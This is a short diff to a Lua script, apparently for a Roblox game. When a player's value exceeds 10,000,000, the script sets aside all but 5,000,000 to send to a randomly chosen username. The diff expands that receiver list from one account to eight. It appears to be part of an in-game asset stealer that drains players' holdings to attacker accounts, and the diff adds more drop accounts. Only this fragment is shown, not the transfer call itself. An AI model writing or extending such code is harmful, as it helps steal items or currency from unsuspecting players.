@@ -15,7 +15,7 @@ if currentValue <= 10000000 then
 	return
 end
 
-local receivers = { "Taryn_Xelvorn389" }
+local receivers = { "Taryn_Xelvorn389", "Itsplumejolt", "ninaFalconBear", "MrsnateFrostFire", "ItstaraSkater2024", "HazelSpecter2024", "NexusRileyPulse50", "TheRealTinajolt2018" }
 local receiver = receivers[math.random(1, #receivers)]
 
 local amountToSend = currentValue - 5000000
